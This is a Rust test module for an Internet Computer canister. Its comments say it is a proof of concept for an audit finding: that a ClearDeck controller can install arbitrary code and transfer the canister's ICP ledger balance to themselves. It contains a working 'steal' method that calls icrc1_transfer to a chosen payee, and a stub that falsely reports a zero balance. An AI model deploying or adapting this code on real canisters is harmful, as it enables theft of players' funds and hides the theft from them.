//! NOT PART OF CLEARDECK. Do not deploy this. Do not add it to `icp.yaml`.
//!
//! This is the module a controller installs when the goal is not to DESTROY a
//! player's balance but to TAKE it. It exists to settle one sentence that
//! ClearDeck's deposit screen and README both used to make:
//!
//!   "Your ICP would stay at the canister's ledger address, unreachable by
//!    anybody, including the operator, who [could not pay] it to themselves.
//!    [Destruction, not] theft, and permanent either way."
//!
//! (Quoted with two words bracketed on purpose: `./scripts/dev.sh hygiene` fails
//! on the exact retracted strings, and this file is not player-facing copy but
//! there is no reason to make the gate's job harder.)
//!
//! The sentence is false. A controller is not restricted to the ClearDeck wasm.
//! `install_code` installs WHATEVER module the controller hands the management
//! canister, and the canister's ledger account is spendable by whatever code is
//! then running in it. The money never had to pass through a ClearDeck method.
//!
//! Driven by `tests/money_safety/tests/controller_custody.rs`
//! (`finding23c_the_operator_can_pay_the_ledger_balance_to_themselves`), which is
//! run by `./scripts/dev.sh custody` and by `./scripts/dev.sh test`.

use candid::{CandidType, Deserialize, Nat, Principal};
use std::cell::RefCell;

/// The ledger to spend from, and the wallet to pay. Both are chosen by whoever
/// installs this module, which on a real table is the controller.
#[derive(CandidType, Deserialize, Clone, Debug)]
pub struct ThiefInit {
    pub ledger: Principal,
    pub thief: Principal,
}

thread_local! {
    static CFG: RefCell<Option<ThiefInit>> = const { RefCell::new(None) };
}

#[ic_cdk::init]
fn init(a: ThiefInit) {
    CFG.with(|c| *c.borrow_mut() = Some(a));
}

#[derive(CandidType, Deserialize, Clone, Debug)]
pub struct Account {
    pub owner: Principal,
    pub subaccount: Option<Vec<u8>>,
}

#[derive(CandidType, Deserialize, Clone, Debug)]
pub struct TransferArg {
    pub from_subaccount: Option<Vec<u8>>,
    pub to: Account,
    pub amount: Nat,
    pub fee: Option<Nat>,
    pub memo: Option<Vec<u8>>,
    pub created_at_time: Option<u64>,
}

/// Move `amount` e8s out of THIS canister's own default ledger account into the
/// payee named at init.
///
/// There is nothing clever here and that is the finding: the canister's account
/// is `Account { owner: <this canister>, subaccount: None }`, and a plain
/// `icrc1_transfer` from a module the controller chose is the entire attack.
#[ic_cdk::update]
async fn steal(amount: u64) -> String {
    let cfg = match CFG.with(|c| c.borrow().clone()) {
        Some(c) => c,
        None => return "no config".to_string(),
    };
    let arg = TransferArg {
        from_subaccount: None,
        to: Account {
            owner: cfg.thief,
            subaccount: None,
        },
        amount: Nat::from(amount),
        fee: Some(Nat::from(10_000u64)),
        memo: None,
        created_at_time: None,
    };
    match ic_cdk::call::Call::unbounded_wait(cfg.ledger, "icrc1_transfer")
        .with_arg(&arg)
        .await
    {
        Ok(_) => "icrc1_transfer accepted".to_string(),
        Err(e) => format!("icrc1_transfer FAILED: {e:?}"),
    }
}

/// So the module answers the same read a player would try after the swap, and
/// the test can show what the player sees.
#[ic_cdk::query]
fn get_balance(_who: Principal) -> u64 {
    0
}

ic_cdk::export_candid!();
